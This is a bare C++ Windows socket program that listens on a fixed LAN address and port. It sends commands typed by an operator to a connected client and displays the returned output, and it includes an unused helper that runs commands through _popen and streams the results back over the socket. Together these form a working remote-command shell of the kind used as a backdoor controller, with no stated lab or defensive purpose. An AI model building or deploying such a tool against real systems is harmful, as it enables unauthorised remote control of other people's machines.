#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")

#define PORT 22235
#define SERVER_IP "192.168.1.137"
#define BUFFER_SIZE 4096

void executeCommand(const std::string& command, SOCKET clientSocket) {
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        send(clientSocket, "Error executing command\n", 24, 0);
        return;
    }

    char buffer[BUFFER_SIZE];
    while (fgets(buffer, BUFFER_SIZE, pipe) != nullptr) {
        send(clientSocket, buffer, strlen(buffer), 0);
    }
    _pclose(pipe);
}

void communicateWithClient(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];

    while (true) {
        // Allow server user to input a command
        std::cout << "Server: Enter a command (exit to quit): ";
        std::string command;
        std::getline(std::cin, command);

        if (command == "exit") {
            send(clientSocket, "exit", 4, 0);
            break;
        }

        // Send command to client
        send(clientSocket, command.c_str(), command.length(), 0);

        // Receive and display the command output from client
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        buffer[bytesReceived] = '\0';
        std::cout << "Client Output:\n" << buffer << std::endl;
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int addrSize = sizeof(clientAddr);

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed\n";
        return 1;
    }

    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed\n";
        return 1;
    }

    std::cout << "Server listening on " << SERVER_IP << ":" << PORT << "...\n";

    while ((clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrSize)) != INVALID_SOCKET) {
        std::cout << "Client connected.\n";
        communicateWithClient(clientSocket);
        closesocket(clientSocket);
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
